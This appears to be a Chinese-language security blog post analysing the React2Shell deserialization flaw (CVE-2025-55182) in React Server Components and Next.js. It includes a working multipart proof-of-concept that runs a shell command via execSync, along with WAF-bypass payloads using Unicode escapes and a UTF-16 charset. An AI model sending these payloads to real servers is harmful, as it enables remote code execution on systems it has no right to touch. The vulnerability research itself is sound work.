---
title: "React2shell"
description: "React2Shell 漏洞分析，围绕 RSC 反序列化风险、利用链和防护思路做复盘。"
pubDate: "2026-03-30"
updatedDate: "2026-03-30"
tags: ["React", "CVE", "Web安全"]
cover: auto
coverAlt: "React2shell 的文章封面"
draft: false
---
## CVE-2025-55182

让我们通过react2shell了解javascript的运行时安全

### 背景

React Server Components（RSC）是一个react提供的服务端渲染机制。它允许组件在服务端执行，并将序列化后的组件数据通过Flight传回客户端，从而减少客户端js体积加快首屏加载速度。

但是react默认使用node.js对js进行渲染，在next.js中默认开启RSC，这样导致RSC运行在node.js环境下，同时RSC的Flight对于反序列化过程缺乏安全验证，最终导致可以巧妙构造利用链实现最终rce。

### 需要利用的一点前置知识[参考react2shell漏洞分析](https://xz.aliyun.com/news/90787)

React Flight Protocol 是 React 用于在客户端和服务器之间传输数据的二进制协议。它使用特殊的前缀符号（以 $ 开头）来表示不同的数据类型和引用。

```
符号	含义	编码示例	解码结果	使用场景
$@	Chunk 引	Promise → "$@1"	getChunk(response, 1)	异步数据、Promise
$K	FormData 引用	FormData → "$K1"	从 FormData 提取 ID=1	表单数据、文件上传
$B	Blob 引用	Blob → "$B1"	response._formData.get("1")	二进制数据、图片
$F	Server Reference（Server Action）	serverAction → "$F1"	loadServerReference(...)	Server Action 函数
$T	Temporary Reference	tempRef → "$T1"	createTemporaryReference(...)	临时引用
$Q	Map 对象	Map → "$Q1"	new Map(...)	Map 数据结构
$R	ReadableStream (text)	ReadableStream → "$R1"	ReadableStream	文本流
$r	ReadableStream (bytes)	ReadableStream → "$r1"	ReadableStream	字节流
$X	AsyncIterable	AsyncIterable → "$X1"	AsyncIterable	异步迭代器
$D	Date 对象	new Date() → "$D2024-01-01T00:00:00.000Z"	new Date(...)	日期时间
$n	BigInt	123n → "$n123"	123n	大整数
$Z	Error 对象	Error → "$Z" + error info	new Error(...)	错误对象
$$	转义的 $	"$hello" → "$$hello"	"$hello"	字面量 $
```

同时Flight协议还会带一个next-action请求头，然后会根据Content-Type（multipart/form-data 或其他）选择相应的解码器： multipart/form-data 使用 decodeReplyFromBusboy，其他情况使用 decodeReply。

### 漏洞形成分析

先看看Server Action的判断在源码next.js/packages/next/src/server/lib/server-action-request-meta.ts很容易发现，这个判断很简单，我们只要随便写一个POST请求，content-type格式为application/x-www-form-urlencoded或者multipart/form-data的一种即可，然后携带一个next action头即可

```ts
  if (req.headers instanceof Headers) {
    actionId = req.headers.get(ACTION_HEADER) ?? null
    contentType = req.headers.get('content-type')
  } else {
    actionId = (req.headers[ACTION_HEADER] as string) ?? null
    contentType = req.headers['content-type'] ?? null
  }

  const isURLEncodedAction = Boolean(
    req.method === 'POST' && contentType === 'application/x-www-form-urlencoded'
  )
  const isMultipartAction = Boolean(
    req.method === 'POST' && contentType?.startsWith('multipart/form-data')
  )
  const isFetchAction = Boolean(
    actionId !== undefined &&
      typeof actionId === 'string' &&
      req.method === 'POST'
  )

  const isPossibleServerAction = Boolean(
    isFetchAction || isURLEncodedAction || isMultipartAction
  )
```

然后在next.js/packages/next/src/server/app-render/action-handler.ts中进行处理，

```ts
if (isMultipartAction) {
            if (isFetchAction) {
                ...
              // A fetch action with a multipart body.
              boundActionArguments = await decodeReplyFromBusboy(
                busboy,
                serverModuleMap,
                { temporaryReferences }
              )
```

显然当我们传入一个multipart/form-data的时候，我们就会到达decodeReplyFromBusboy函数，然后看看这个函数的实现

在react/packages/react-server-dom-esm/src/server/ReactFlightDOMServerNode.js中，我们不难发现

```ts

function decodeReplyFromBusboy<T>(
  busboyStream: Busboy,
  moduleBasePath: ServerManifest,
  options?: {temporaryReferences?: TemporaryReferenceSet},
): Thenable<T> {
  const response = createResponse(
    moduleBasePath,
    '',
    options ? options.temporaryReferences : undefined,
  );
```

这里返回了一个Thenable，而且busboyStream会对我们的请求包内容进行解析，然后再到 resolveField(response, queuedFields[i], queuedFields[i + 1]);对内容进行解释，设置好slot表和根节点_root，然后这里最后是会  return getRoot(response);

随之getRoot我们来到react/packages/react-server/src/ReactFlightReplyServer.js，

```ts
export function getRoot<T>(response: Response): Thenable<T> {
  const chunk = getChunk(response, 0);
  return (chunk: any);
}
```

然后跟踪getChunk，

```ts
function getChunk(response: Response, id: number): SomeChunk<any> {
  const chunks = response._chunks;
  let chunk = chunks.get(id);
  if (!chunk) {
    const prefix = response._prefix;
    const key = prefix + id;
    // Check if we have this field in the backing store already.
    const backingEntry = response._formData.get(key);
    if (backingEntry != null) {
      // We assume that this is a string entry for now.
      chunk = createResolvedModelChunk(response, (backingEntry: any), id);
    } else if (response._closed) {
      // We have already errored the response and we're not going to get
      // anything more streaming in so this will immediately error.
      chunk = createErroredChunk(response, response._closedReason);
    } else {
      // We're still waiting on this entry to stream in.
      chunk = createPendingChunk(response);
    }
    chunks.set(id, chunk);
  }
  return chunk;
}
```

这里对我们请求包进行了chunk化，先从入口点1然后引用到0，大致流程为

```ts
getChunk(1)
  ↓
createResolvedModelChunk
  ↓
JSON.parse("$@0")
  ↓
_fromJSON("$@0")
  ↓
getChunk(0)

function createResolvedModelChunk<T>(
  response: Response,
  value: string,
  id: number,
): ResolvedModelChunk<T> {
  // $FlowFixMe[invalid-constructor] Flow doesn't support functions as constructors
  return new Chunk(RESOLVED_MODEL, value, id, response);
}

function Chunk(status: any, value: any, reason: any, response: Response) {
  this.status = status;
  this.value = value;
  this.reason = reason;
  this._response = response;
}
```

然后我们就成功将我们的payload加载到了chunk中，理论上讲我们这个引用链可以自定义长度

因为是await getRoot，使用我们会自然调用chunk的then

```ts
Chunk.prototype.then = function <T>(
  this: SomeChunk<T>,
  resolve: (value: T) => mixed,
  reject: (reason: mixed) => mixed,
) {
  const chunk: SomeChunk<T> = this;
  // If we have resolved content, we try to initialize it first which
  // might put us back into one of the other states.
  switch (chunk.status) {
    case RESOLVED_MODEL:
      initializeModelChunk(chunk);
      break;
  }
    switch (chunk.status) {
    case INITIALIZED:
      resolve(chunk.value);
      break;
```

然后我们来到initializeModelChunk在这里面实现了

```ts
const rawModel = JSON.parse(resolvedModel);  const resolvedModel = chunk.value;
 const value: T = reviveModel(
      chunk._response,
      {'': rawModel},
      '',
      rawModel,
      rootReference,
    );
```

我们来到reviveModel

```ts
  if (typeof value === 'string') {
    // We can't use .bind here because we need the "this" value.
    return parseModelString(response, parentObj, parentKey, value, reference);
  }
```

然后来到parseModelString

```ts
function parseModelString(
  response: Response,
  obj: Object,
  key: string,
  value: string,
  reference: void | string,
): any {
  if (value[0] === '$') {
    switch (value[1]) {
      case '$': {
        // This was an escaped string value.
        return value.slice(1);
      }
      case '@': {
        // Promise
        const id = parseInt(value.slice(2), 16);
        const chunk = getChunk(response, id);
        return chunk;
      }
            case 'B': {
        // Blob
        const id = parseInt(value.slice(2), 16);
        const prefix = response._prefix;
        const blobKey = prefix + id;
        // We should have this backingEntry in the store already because we emitted
        // it before referencing it. It should be a Blob.
        const backingEntry: Blob = (response._formData.get(blobKey): any);
        return backingEntry;
      }
```

这里实现了递归调用的处理，"$@x"返回了一个promise，这里的case 'B':是我们需要的攻击点，很显然到这里我们已经可以命令执行了

看看poc

```ts
Next-Action: x
X-Nextjs-Request-Id: 51fe50ef2a379133
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye12x8j2O
X-Nextjs-Html-Request-Id: 2344e891bc6a0657004928128530dc287d17a91
Content-Length: 499

------WebKitFormBoundarye12x8j2O
Content-Disposition: form-data; name="0"

{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "process.mainModule.require('child_process').execSync('id');",
"_chunks": "",
"_formData": {
"get": "$1:constructor:constructor"
}
}
}
------WebKitFormBoundarye12x8j2O
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundarye12x8j2O--
```

首先我们通过"$@0"递归调用来到chunk0，第一步reviveModel解析完后我们首先是拿到了chunk0.value，`$1:__proto__:then`这个变成了chunk.prototype.then，这里最巧妙的点在于chunk.prototype.then，根据PRP原则，看到我们这里还有一个then方法，然后就继续调用，然后再次处理我们这个恶意payload，这一次将{\"then\":\"$B1337\"}完全解析，然后通过$B，和被污染的"_formData": {"get": "Function"}，将_prefix拼到命令中，最终命令执行

这里我们详细讲一下我们的poc在整个过程发生了什么

首先我们的请求包先会被busboy解析，将我们的请求包简单转换一下，然后就来到getChunk，同时此刻外部getRoot之前的的await在等待返回一个Chunk。

然后我们的"$@0"首先被解析，进入createResolvedModelChunk函数，new了一个chunk，然后因为Chunk的原型自带then方法，然后我们进入initializeModelChunk(chunk);

在initializeModelChunk(chunk);中首先对chunk的value进行了json.parse，然后同时后续进行了revivemodel，然后来到了parseModelString，将我们最开始的入口点"$@0"进行解析，然后自然而然的递归调用到了slot(0)，因为在之前的步骤中构建response时，"$@0"已经被解析为slot(1)在现在被引用到slot(0)

然后对我们的payload重复上述步骤，因为json.parse的缘故，我们的payload将会变为

```ts
{
"then": "Chunk.prototype.then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "process.mainModule.require('child_process').execSync('id');",
"_chunks": "",
"_formData": {
"get": "Function"
}
}
}
```

然后我们的Chunk0的value被返回时，函数发现我们还有一个then方法，然后根据PRP原则，我们的then方法被设置为了Chunk.prototype.then，再一次对这个假chunk进行操作，然后解析value，解析value时发现我们的$B1337，转到case B，然后将会调用被传进去的我们的假chunk的response，调用_fromData.get()也就时我们获得的Function，然后id和prefix拼接作为参数，最终实现命令执行

### 聊聊漏洞防御

官方最后为response引入了symbol这是我们json反序列化无法做到的

```ts
type RESPONSE_SYMBOL_TYPE = 'RESPONSE_SYMBOL'; // Fake symbol type.
const RESPONSE_SYMBOL: RESPONSE_SYMBOL_TYPE = (Symbol(): any);
```

当然在这个补丁之前，有许多waf诞生

比如直接将constructor全拦下来，当然这样的waf肯定会有漏洞的，比如Unicode一下就可以绕过，因为json支持Unicode，\u0063\u006F\u006E\u0073\u0074\u0072\u0075\u0063\u0074\u006F\u0072，或者\u0063onstructor，但是一般的waf不会这么业余

所以我们可以找到一个其他的方法，参考至离别歌师傅的[React2Shell攻防笔记](https://www.leavesongs.com/PENETRATION/deep-dive-into-react2shell.html)，我们发现busboy这个第三方库中存在可以利用的点

然后我们发现了一个UTF-16的利用点，我们可以再多传一个内容，然后将get的值设为我们第四那个值的$3

我们可以发一个包的content-type的charset设置为UTF-16，然后我们就可以成功绕过

然后我们也可以知晓多重unicode也可以绕过waf，如

```json
{
  "then": "$1:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\": \"\\u00241:then\", \"status\": \"resolved_model\", \"reason\": -1, \"value\": \"{\\\"then\\\":\\\"\\u0024B1337\\\"}\", \"_response\": {\"_prefix\": \"var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=\\u0024{res};307;`});\", \"_chunks\": [], \"_formData\": {\"get\": \"$1:\u005cu0063onstructor:\u005cu0063onstructor\"}}}",
  "_response": {
    "_chunks": "$1:_response:_chunks"
  }
}
```

但你果然我们也可以不一定一定有multipart头，因为如果没有会检测我们的next actionid是否存在，所以再已存在next actionid可以用的情况下，将这个hex字符串放在Next-Action头中，即可利用application/x-www-form-urlencoded来发送数据包。